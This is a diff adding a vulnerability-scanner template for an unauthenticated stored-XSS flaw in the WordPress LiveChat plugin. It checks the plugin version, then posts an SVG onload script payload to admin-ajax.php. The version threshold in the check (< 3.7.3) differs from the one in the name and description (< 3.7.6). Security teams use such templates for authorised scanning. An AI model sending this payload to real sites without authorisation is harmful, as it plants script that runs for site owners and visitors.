@@ -1,0 +1,61 @@
+flow: http(1) && http(2)
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: version
+    part: body
+    regex:
+    - (?i)Stable tag:\s*([\w.]+)
+    type: regex
+  matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - contains(body, "LiveChat")
+    - compare_versions(version, "< 3.7.3")
+    type: dsl
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt'
+- matchers:
+  - condition: or
+    status:
+    - 200
+    - 400
+    type: status
+  - part: body
+    type: word
+    words:
+    - '0'
+  matchers-condition: and
+  raw:
+  - 'POST /wp-admin/admin-ajax.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    licenseNumber=42&licenseEmail=%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E
+
+    '
+id: wp-livechat-stored-xss
+info:
+  author: 0x_Akoko
+  description: 'WordPress LiveChat plugin before < 3.7.6 lacked CSRF and authorization
+    checks on the option update handler in the LiveChatAdmin constructor. The code
+    ran on any POST to a wp-admin URL without Referer validation, nonce check, or
+    capability verification. This allowed unauthenticated attackers to update plugin
+    settings.
+
+    '
+  metadata:
+    max-request: 2
+    verified: true
+  name: WordPress LiveChat < 3.7.6 - Unauthenticated Stored XSS
+  reference:
+  - https://wpscan.com/plugin/wp-live-chat-software-for-wordpress/
+  - https://wordpress.org/plugins/wp-live-chat-software-for-wordpress
+  severity: high
+  tags: livechat,stored-xss,unauth,wordpress,wp,wp-plugin,wpscan,xss
